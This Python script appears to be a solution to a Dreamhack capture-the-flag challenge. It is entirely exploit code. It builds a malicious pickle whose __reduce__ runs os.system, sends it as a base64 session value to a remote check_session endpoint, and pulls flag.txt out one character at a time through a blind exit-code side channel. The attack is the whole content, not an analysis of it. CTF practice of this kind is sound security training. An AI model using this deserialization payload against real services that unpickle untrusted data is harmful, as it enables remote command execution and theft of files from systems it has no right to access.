from base64 import b64decode, b64encode
import requests, pickle, re, os, string

cmd = ''
class Evil(object):
    def __reduce__(self):
        return (os.system, (cmd,))

def Load(enc):
    return pickle.loads(b64decode(enc))
def Dump(cmd):
    return b64encode(pickle.dumps(cmd))

port = 14377
url = 'http://host1.dreamhack.games:{}/check_session'.format(port)
info = {'name' : Evil(), 'userid' : 'test', 'password' : 'p@asss'}
table = string.digits + string.ascii_uppercase + string.ascii_lowercase + '='
flag_find = 0
flag = ''
while True:
    flag_find = 0
    for ch in table:
        cmd = 'a=$(cat flag.txt | base64); if [ ${{a:{0}:1}} == \'{1}\' ]; then cat aesfasdf; else ls; fi;'.format(len(flag), ch)
        #print('payload: ' + cmd)
        res = requests.post(url, data={'session' : Dump(info)})
        pt = re.compile('Name: \d+')
        m = pt.findall(res.text)
        pt = re.compile('\d+')
        code = int(pt.findall(m[0])[0], 10)
        #print('server: ' + str(code))
        if code != 0:
            flag += ch
            flag_find = 1
            break
    if flag_find == 0:
        break
print('base64 : ' + str(flag))
print('Flag is : ' + b64decode(flag).decode())
